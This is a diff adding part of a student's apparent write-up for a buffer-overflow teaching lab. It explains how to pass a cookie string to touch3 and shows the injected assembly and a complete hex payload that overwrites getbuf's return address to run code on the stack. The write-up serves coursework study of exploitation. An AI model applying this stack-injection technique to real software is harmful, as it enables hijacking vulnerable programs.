@@ -125,3 +125,38 @@ Also, adding some magic :joy:
 ```
 
 ## LEVEL 3
+
+In this phase, we need to pass paremeter as a string. As usual, we need to jump to `touch3` in the first place.
+
+The string should be stored in a save place. The reason is that after `getbuf` returned, its stack frame may be overwrriten by `hexmatch` and `strncmp` called in `touch3`. Actually, I find myself lucky enouch to find out a place that probably wouldn't be overwritten. That's a way to solve it...
+
+Here's a better version.
+
+The first thing we wanna do is to change the `cookie` into hex representation. My `cookie` is `0x110dfc17`, which is `31 31 30 64 66 63 31 37 00` in hex (mind the trailing zero).
+
+Where is safe? `getbuf` is called by `test`, we might just as well save the string in stack frame of `test`.
+
+How about the exploit code? Well, we just need to load the address of `cookie` string to `%rdi` and then return to `touch3`.
+
+Now, just like what we do in LEVEL 2. We change the return address of `getbuf` to `%rsp`. By directly wrting `touch3`'s address to buffer, we can simply use a ret in exploit code to jump to it. And above all these, we encode the cookie string safely.
+
+exploit code:
+
+```s
+leaq 8(%rsp),%rdi    # when executing, cookie is at %rsp+8
+ret
+```
+
+```txt
+48 8d 7c 24 08 c3 00 00 /* exploit code, 6 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+08 c6 67 55 00 00 00 00 /* return to %rsp (exploit code) */
+f6 17 40 00 00 00 00 00 /* return to touch3 */
+31 31 30 64 66 63 31 37
+00                      /* string cookie, 9 bytes */
+```
